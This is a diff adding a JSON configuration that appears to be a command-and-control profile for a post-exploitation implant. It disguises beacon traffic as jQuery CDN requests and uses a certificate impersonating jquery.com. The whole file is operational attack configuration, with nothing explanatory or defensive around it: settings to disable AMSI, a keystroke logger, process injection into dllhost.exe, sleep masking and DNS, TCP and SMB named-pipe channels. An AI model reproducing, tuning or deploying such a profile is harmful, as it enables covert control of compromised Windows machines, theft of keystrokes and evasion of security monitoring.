@@ -1,0 +1,124 @@
+{
+  "name": "jQuery CS 4.2 Profile",
+  "http_config": {
+    "user_agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
+    "headers": {
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.5",
+      "Referer": "http://code.jquery.com/",
+      "Accept-Encoding": "gzip, deflate"
+    },
+    "server_headers": {
+      "Server": "NetDNA-cache/2.2",
+      "Cache-Control": "max-age=0, no-cache",
+      "Pragma": "no-cache",
+      "Connection": "keep-alive",
+      "Content-Type": "application/javascript; charset=utf-8"
+    }
+  },
+  "https_config": {
+    "certificate": {
+      "common_name": "jquery.com",
+      "organization": "jQuery",
+      "organizational_unit": "Certificate Authority",
+      "country": "US",
+      "validity": 365
+    }
+  },
+  "reconnect_interval": 45000,
+  "jitter": 37,
+  "max_errors": 10,
+  "http_get": {
+    "path": "/jquery-3.3.1.min.js",
+    "method": "GET",
+    "headers": {
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Referer": "http://code.jquery.com/"
+    },
+    "metadata": {
+      "type": "cookie",
+      "name": "__cfduid",
+      "encoding": "base64url"
+    }
+  },
+  "http_post": {
+    "path": "/jquery-3.3.2.min.js",
+    "method": "POST",
+    "headers": {
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Referer": "http://code.jquery.com/"
+    },
+    "id": {
+      "type": "query",
+      "name": "__cfduid",
+      "encoding": "base64url"
+    },
+    "output": {
+      "encoding": "base64url"
+    }
+  },
+  "dns_config": {
+    "max_length": 255,
+    "idle_resolver": "74.125.196.113",
+    "max_txt_size": 252,
+    "stager_prepend": ".resources.123456.",
+    "stager_subhost": ".feeds.123456."
+  },
+  "tcp_config": {
+    "port": 42585,
+    "frame_header": "80"
+  },
+  "smb_config": {
+    "pipename": "mojo.5688.8052.183894939787088877##",
+    "stager_pipename": "mojo.5688.8052.35780273329370473##",
+    "frame_header": "80"
+  },
+  "post_ex": {
+    "spawnto_x86": "%windir%\\\\syswow64\\\\dllhost.exe",
+    "spawnto_x64": "%windir%\\\\sysnative\\\\dllhost.exe",
+    "obfuscate": true,
+    "smartinject": true,
+    "amsi_disable": true,
+    "keylogger": "GetAsyncKeyState",
+    "pipename": "Winsock2\\\\CatalogChangeListener-###-0,"
+  },
+  "stage": {
+    "userwx": false,
+    "stomppe": true,
+    "obfuscate": true,
+    "cleanup": true,
+    "sleep_mask": true,
+    "smartinject": true,
+    "checksum": 0,
+    "compile_time": "2016-11-11T04:08:32Z",
+    "entry_point": 650688,
+    "image_size_x86": 4661248,
+    "image_size_x64": 4661248,
+    "name": "srv.dll",
+    "transform_x86": {
+      "prepend": "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"
+    },
+    "transform_x64": {
+      "prepend": "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"
+    },
+    "strings": ["jQuery"]
+  },
+  "process_inject": {
+    "allocator": "NtMapViewOfSection",
+    "min_alloc": 17500,
+    "startrwx": false,
+    "userwx": false,
+    "transform_x86": {
+      "prepend": "\\x90\\x90"
+    },
+    "transform_x64": {
+      "prepend": "\\x90\\x90"
+    },
+    "execute": {
+      "CreateThread": "ntdll!RtlUserThreadStart+0x42",
+      "NtQueueApcThread-s": true,
+      "CreateRemoteThread": true,
+      "RtlCreateUserThread": true
+    }
+  }
+}
